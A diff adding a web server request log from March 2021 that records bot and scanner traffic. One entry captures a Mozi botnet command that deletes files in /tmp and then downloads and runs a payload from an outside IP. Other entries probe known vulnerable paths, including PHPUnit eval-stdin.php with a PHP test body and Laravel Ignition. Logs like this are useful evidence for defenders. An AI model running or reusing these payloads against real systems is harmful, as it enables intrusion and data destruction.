@@ -1,0 +1,90 @@
+#**# 2021-03-02 04:08:16.750 [d018817c361a421da0e316e1a17b6aa5]
+[F] - 2021-03-02 04:08:16.748
+	id: null
+	info: GET / 174.138.4.57 
+	controller:  > 
+	query: {null}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 1ms
+#**#
+#**# 2021-03-02 04:08:17.089 [48f74130b861416eb1438b043f3162a1]
+[F] - 2021-03-02 04:08:17.089
+	id: null
+	info: GET /favicon.ico 174.138.4.57 
+	controller:  > 
+	query: {null}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 0ms
+#**#
+#**# 2021-03-02 04:08:22.360 [48e05001619141db8dc69835b9dca1bb]
+[F] - 2021-03-02 04:08:22.359
+	id: null
+	info: GET /shell 27.201.157.159 
+	controller:  > 
+	query: {cd+/tmp;rm+-rf+*;wget+http://27.201.157.159:54221/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 1ms
+#**#
+#**# 2021-03-02 04:19:14.419 [f3a2033813064b1bbb31981a1d36bccf]
+[F] - 2021-03-02 04:19:14.418
+	id: null
+	info: GET / 142.93.244.247 
+	controller:  > 
+	query: {null}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 1ms
+#**#
+#**# 2021-03-02 04:29:07.280 [6cbb729764a440e08bf6e40bb32b4724]
+[F] - 2021-03-02 04:29:07.279
+	id: null
+	info: GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 45.155.205.225 
+	controller:  > 
+	query: {null}
+	body: <?=md5("phpunit")?>
+	returnCode: -1(-1)
+	elapsed-time: 1ms
+#**#
+#**# 2021-03-02 04:29:15.058 [4df3684753144571abf8e05ac93e5a88]
+[F] - 2021-03-02 04:29:15.058
+	id: null
+	info: GET /wp-content/plugins/wp-file-manager/readme.txt 45.155.205.225 
+	controller:  > 
+	query: {null}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 0ms
+#**#
+#**# 2021-03-02 04:29:18.970 [81d2290d8f704135b58f111c72515898]
+[F] - 2021-03-02 04:29:18.969
+	id: null
+	info: GET /console/ 45.155.205.225 
+	controller:  > 
+	query: {null}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 1ms
+#**#
+#**# 2021-03-02 04:29:22.347 [0b8afd27decd4838b130880ec819a447]
+[F] - 2021-03-02 04:29:22.346
+	id: null
+	info: GET /_ignition/execute-solution 45.155.205.225 
+	controller:  > 
+	query: {null}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 1ms
+#**#
+#**# 2021-03-02 04:40:27.945 [9b1672365f254d7a94373f5cf29ca256]
+[F] - 2021-03-02 04:40:27.944
+	id: null
+	info: GET / 65.49.20.69 
+	controller:  > 
+	query: {null}
+	body: 
+	returnCode: -1(-1)
+	elapsed-time: 1ms
+#**#
